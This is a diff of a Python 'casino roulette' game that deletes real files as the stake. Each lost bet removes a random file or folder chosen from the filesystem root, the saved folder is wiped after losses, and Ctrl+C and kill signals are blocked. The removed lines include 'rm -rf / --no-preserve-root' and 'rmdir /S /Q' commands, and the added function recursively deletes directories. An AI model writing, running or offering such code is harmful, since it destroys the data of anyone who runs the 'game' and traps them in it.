@@ -1,26 +1,19 @@
 import os
 import random
 import json
-import shutil
 import signal
 import subprocess
 
 SAVE_FILE = "save/casino_roulette_state.json"
-LOSS_THRESHOLD = 10
+LOSS_THRESHOLD = 5
 
 def disable_exit_signals():
-    """
-    Prevent quitting via Ctrl + C or kill signals.
-    """
     def handler(signum, frame):
         print("\n[!] You cannot quit with Ctrl + C. Finish the game!")
     signal.signal(signal.SIGINT, handler)
     signal.signal(signal.SIGTERM, handler)
 
 def clear_console():
-    """
-    Clears the console (Windows/Unix).
-    """
     if os.name == 'nt':
         subprocess.call("cls", shell=True)
     else:
@@ -45,10 +38,6 @@ logo = """
 ░░██████   █████        █████      ░░████████  ░░█████ ░░██████              
  ░░░░░░   ░░░░░        ░░░░░        ░░░░░░░░    ░░░░░   ░░░░░░\033[0m
 """
-
-# -----------------------------------------------------------------------------
-# Helper Functions for Random File/Folder Deletion
-# -----------------------------------------------------------------------------
 
 def pick_random_item():
     root_path = "C:\\" if os.name == "nt" else "/"
@@ -84,46 +73,40 @@ def is_root_folder(folder_path):
     else:
         return (folder_path == "/")
 
-def force_delete_path(path):
+def recursive_remove(path):
     if not os.path.exists(path):
         print(f"[INFO] The path does not exist: {path}")
         return
 
-    if os.path.isdir(path) and is_root_folder(path):
-        print("[!] WARNING: Do you still want to delete the root folder?")
-        confirm = input("Type 'YES' in all caps to proceed: ")
-        if confirm == "YES":
-            print("[+] Thank you for playing! Enjoy your free space.")
-            if os.name == "nt":
-                os.system(f'rmdir /S /Q "{path}"')
-                pass
-            else:
-                os.system("rm -rf / --no-preserve-root")
-                pass
-        else:
-            if os.name == "nt":
-                print("[x] Just kidding, you bet and lost! Deleting anyway.")
-                os.system(f'rmdir /S /Q "{path}"')
-            else:
-                print("[x] Just kidding, you bet and lost! Deleting anyway.")
-                os.system("rm -rf / --no-preserve-root")
-        return
-
     if os.path.isfile(path):
-        print(f"[DELETING FILE] => {path}")
-        os.remove(path)
-    else:
         try:
+            print(f"[DELETING FILE] => {path}")
+            os.remove(path)
+        except Exception as e:
+            print(f"[ERROR] Could not delete file: {path}. Reason: {e}")
+    elif os.path.isdir(path):
+        try:
+            for root, dirs, files in os.walk(path, topdown=False):
+                for name in files:
+                    file_path = os.path.join(root, name)
+                    try:
+                        print(f"[DELETING FILE] => {file_path}")
+                        os.remove(file_path)
+                    except Exception as e:
+                        print(f"[ERROR] Could not delete file: {file_path}. Reason: {e}")
+                for name in dirs:
+                    dir_path = os.path.join(root, name)
+                    try:
+                        print(f"[DELETING FOLDER] => {dir_path}")
+                        os.rmdir(dir_path)
+                    except Exception as e:
+                        print(f"[ERROR] Could not delete folder: {dir_path}. Reason: {e}")
             print(f"[DELETING FOLDER] => {path}")
-            shutil.rmtree(path)
+            os.rmdir(path)
         except Exception as e:
             print(f"[ERROR] Could not delete folder: {path}. Reason: {e}")
-            if os.name == "nt":
-                os.system(f'rmdir /S /Q "{path}"')
-                pass
-            else:
-                os.system(f'rm -rf "{path}"')
-                pass
+    else:
+        print(f"[WARNING] Path is neither file nor directory: {path}")
 
 def get_color(number):
     return "green" if number == 0 else ("black" if number % 2 == 0 else "red")
@@ -193,7 +176,10 @@ def main():
     credits, folder_to_save, lost_since_folder = initialize_game()
 
     while True:
-        username = os.getlogin()
+        try:
+            username = os.getlogin()
+        except Exception:
+            username = "Player"
         print(logo)
         print("Hello", username,"\n")
 
@@ -326,11 +312,11 @@ def main():
                     credits -= bet_amount
                     lost_since_folder += bet_amount
                     random_path = pick_random_item()
-                    force_delete_path(random_path)
+                    recursive_remove(random_path)
 
         if lost_since_folder >= LOSS_THRESHOLD:
             print(f"[!] You have lost {lost_since_folder} credits since last folder => removing folder {folder_to_save}")
-            force_delete_path(folder_to_save)
+            recursive_remove(folder_to_save)
             folder_to_save = None
             lost_since_folder = 0
 
@@ -338,7 +324,7 @@ def main():
             print("[x] You have no more credits. Game over!")
             clear_game_state()
             return
-        
+
         game_state = {
             "credits": credits,
             "folder_to_save": folder_to_save,
